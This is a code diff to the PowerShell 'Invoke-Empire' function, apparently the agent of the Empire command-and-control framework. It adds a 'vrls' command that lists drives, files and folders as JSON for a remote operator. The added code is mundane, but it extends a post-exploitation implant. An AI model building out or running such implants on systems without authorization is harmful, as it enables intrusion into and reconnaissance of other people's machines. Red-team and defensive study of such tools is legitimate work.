@@ -279,7 +279,31 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
-                '(ls|^dir)' {
+                vrls {
+                    $path = "/"
+                    if ($cmdargs.length -ne "") { # Use user supplied directory
+                        $path = $cmdargs
+                    }
+                    if ($path -eq "/") { # if the path is root, list drives as directories
+                        $array = @()
+                        $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} |  ForEach-Object {
+                            $array += (@{path =  $_.Root; name = $_.Root; is_file = $false})
+                        }
+                        $json = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress
+                        $output = "vrls|" + $json
+                    } elseif (-Not (Test-Path $path -PathType Container)) { # if path doesn't exist
+                        $output = "Directory " + $path + " not found."
+                    } else { # Normal conditions
+                        $array = @()
+                        Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{path = $_.FullName; name = $_.Name; is_file = $true })}
+                        Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{path = $_.FullName; name = $_.Name; is_file = $false })}
+                        $directory = Get-Item -Path $path # this way we always get the backslashes even if user supplied forward slashes
+                        $json = @{directory_name = $directory.Name; directory_path = $directory.FullName; items = $array} | ConvertTo-Json -Compress
+                        $output = "vrls|" + $json
+                    }
+                    break
+                }
+               '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
                         $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
